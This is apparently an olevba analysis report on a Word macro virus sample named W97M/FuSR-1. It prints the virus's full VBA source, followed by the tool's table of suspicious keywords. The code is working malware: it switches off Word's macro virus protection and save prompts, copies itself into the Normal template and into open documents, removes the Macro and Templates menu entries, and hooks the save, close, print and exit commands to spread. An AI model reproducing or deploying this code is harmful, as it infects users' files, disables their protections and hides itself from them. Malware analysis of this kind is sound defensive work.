olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.AntiSR1.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.AntiSR1.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FuSR_1.bas 
in file: Virus.MSWord.AntiSR1.a - OLE stream: 'Macros/VBA/FuSR_1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub FuSR_1()
    
    'W97M/FuSR-1.Poppy
    'FuSR-1 (Fuck You Service Release 1)
    'First Macro Virus to work with SR-1
    
    'Produced by,
    'The VicodinES Macro.Poppy Construction Kit v1.0c
    '================================================
  
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
ActiveDocument.ReadOnlyRecommended = False
basname$ = "c:\FuSR_1.bas"
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(I).Name = "FuSR_1" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(I).Name = "FuSR_1" Then ActivInstall = True
Next I
If ActivInstall = False Then
    Application.VBE.ActiveVBProject.VBComponents("FuSR_1").Export "basname$"
    With ActiveDocument.VBProject
        With .VBComponents.Import("basname$")
        End With
    End With
    Kill ("basname$")
End If
If NormInstall = False Then
    Application.VBE.ActiveVBProject.VBComponents("FuSR_1").Export "basname$"
    With NormalTemplate.VBProject
        With .VBComponents.Import("basname$")
        End With
    End With
    Kill ("basname$")
End If
If ActivInstall = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If NormInstall = False Then
     If NormalTemplate.Saved = False Then NormalTemplate.Save
     End If
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Templates and add-ins...").Delete
'VMPCK v1.0c
fuckoff:
End Sub
Sub FileSave()
    On Error Resume Next
    Call FuSR_1
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call FuSR_1
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Dialogs(wdDialogFileSaveAs).Show
    Call FuSR_1
End Sub
Sub FilePrint()
    On Error Resume Next
    Dialogs(wdDialogFilePrint).Show
    Call FuSR_1
End Sub
Sub FileExit()
    On Error Resume Next
    Call FuSR_1
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub AutoExit()
    On Error Resume Next
    Call FuSR_1
End Sub
Sub ViewVBCode()
    On Error Resume Next
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

